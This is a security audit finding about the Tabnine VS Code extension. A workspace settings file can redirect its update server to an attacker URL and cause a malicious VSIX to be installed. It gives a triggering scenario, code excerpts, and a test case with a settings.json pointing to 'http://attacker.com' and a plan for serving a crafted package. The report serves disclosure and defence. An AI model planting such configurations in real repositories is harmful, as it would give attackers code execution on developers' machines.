# Identified Vulnerabilities

## Arbitrary VSIX Update via Malicious Server URL in Workspace Settings

### Description
A malicious repository may include a settings file (for example, a .vscode/settings.json) that sets the extension's update server configuration (using keys such as `TABNINE_HOST_CONFIGURATION` or `SELF_HOSTED_SERVER_CONFIGURATION`) to an attacker‑controlled URL. The extension's update task (in `/code/src/enterprise/update/updateTask.ts`) uses the configured server URL to construct update endpoints via the JavaScript `URL` constructor and then downloads the VSIX update from that server. Although a helper function (`validateUrl` in `/code/src/enterprise/update/serverUrl.ts`) ensures that the URL is syntactically valid, no check is made against a whitelist of approved (trusted) domains. As a result, an attacker could host a malicious VSIX package at a remote location and force its download and installation on the victim's machine.

*Step by step triggering scenario:*  
1. An attacker creates a repository with a malicious .vscode/settings.json file that sets the update server configuration key (e.g. `"TABNINE_HOST_CONFIGURATION"`) to a domain under attacker control (for example, `http://attacker.com`).
2. When a victim opens this repository in VS Code, the extension uses its `serverUrl()` function to read the update server URL from the workspace configuration.
3. In the update task (in `/code/src/enterprise/update/updateTask.ts`), the extension constructs URLs such as  
   `new URL(`${UPDATE_PREFIX}/version`, [attacker-controlled URL])`  
   and  
   `new URL(`${UPDATE_PREFIX}/tabnine-vscode-${latestVersion}.vsix`, [attacker-controlled URL])`.
4. The extension then downloads the update package from the attacker‑controlled server and executes the install command for the VSIX file.
5. If the downloaded VSIX is malicious, it may lead to arbitrary code execution within the victim's Visual Studio Code environment.

### Impact
An attacker who controls the configured update server can force the installation of a malicious VSIX package. This leads to remote code execution in the victim's environment, allowing the attacker to potentially compromise sensitive data, execute arbitrary commands, or otherwise take over the victim's machine via the compromised extension.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- The helper function `validateUrl` in `/code/src/enterprise/update/serverUrl.ts` uses `Uri.parse(url, true)` to check that the URL is syntactically valid.  
- Child process invocations (for example, in the update process) are performed with structured APIs, and the vsix download is triggered only after a version check.

However, these checks only ensure the URL "looks" like a valid URL and do not restrict its origin.

### Missing Mitigations
- **Domain Whitelisting:** There is no verification that the server URL is from a trusted host. The extension should enforce that the update URL comes only from a known, approved domain (for example, Tabnine's official update server).  
- **Digital Signature/Integrity Verification:** The downloaded VSIX package is not verified by any cryptographic means. The update process should include digital signature validation to ensure that only authentic updates are installed.

### Preconditions
- The victim opens a repository that (maliciously) sets the update server configuration via its workspace settings (e.g. .vscode/settings.json).  
- The malicious configuration causes the extension to use an attacker‑controlled URL as the update server.  
- The attacker hosts a malicious VSIX file (and corresponding version information) at that URL.
- The update process is triggered (either automatically or by user action) so that the extension downloads and installs the VSIX.

### Source Code Analysis
- In `/code/src/enterprise/update/serverUrl.ts`, the function `serverUrl()` retrieves the update server URL from workspace configuration using the keys `SELF_HOSTED_SERVER_CONFIGURATION` and `TABNINE_HOST_CONFIGURATION`. The URL is then "validated" only by parsing it (see `validateUrl(url)`), which does not enforce a trusted domain policy.  
- In `/code/src/enterprise/update/updateTask.ts`, the code constructs update endpoints using the attacker‑controlled `serverUrl`. For example, it calls:  
  ```
  let latestVersion = await downloadFileToStr(new URL(`${UPDATE_PREFIX}/version`, serverUrl));
  …
  await downloadFileToDestination(new URL(`${UPDATE_PREFIX}/tabnine-vscode-${latestVersion}.vsix`, serverUrl), path);
  await commands.executeCommand(INSTALL_COMMAND, Uri.file(path));
  ```
  The lack of any check on the domain of `serverUrl` means that an attacker may supply a URL pointing to a malicious update server, leading directly to the download and execution of a malicious VSIX package.

### Security Test Case
1. **Preparation:**  
   - Create a test repository that includes a file at .vscode/settings.json with a configuration entry such as:  
     ```
     {
       "TABNINE_HOST_CONFIGURATION": "http://attacker.com"
     }
     ```
   - Set up an HTTP server at `http://attacker.com` that:
     - Responds to GET requests on `/update/version` (assuming `UPDATE_PREFIX` is `/update`) with a plain text version string (for example, `1.2.3-malicious`).
     - Responds to GET requests on `/update/tabnine-vscode-1.2.3-malicious.vsix` with a VSIX file crafted for testing (or a dummy file that can be detected in logs).
2. **Execution:**  
   - Open the test repository in VS Code with the extension enabled.
   - Ensure that the extension reads the workspace configuration and uses the attacker‑controlled URL.
   - Trigger the update process (this can be done by manually invoking the update command if available, or by waiting for the update process to run automatically).
3. **Verification:**  
   - Monitor network requests and logs to verify that the extension constructs an update URL based on `http://attacker.com` and contacts the malicious server.  
   - Confirm that the downloaded file is passed to the install command (for example, by checking that `commands.executeCommand(INSTALL_COMMAND, Uri.file(path))` is called with a file downloaded from the attacker URL).
   - (In a controlled test environment) Validate that the update mechanism would install the VSIX from the attacker‑controlled source.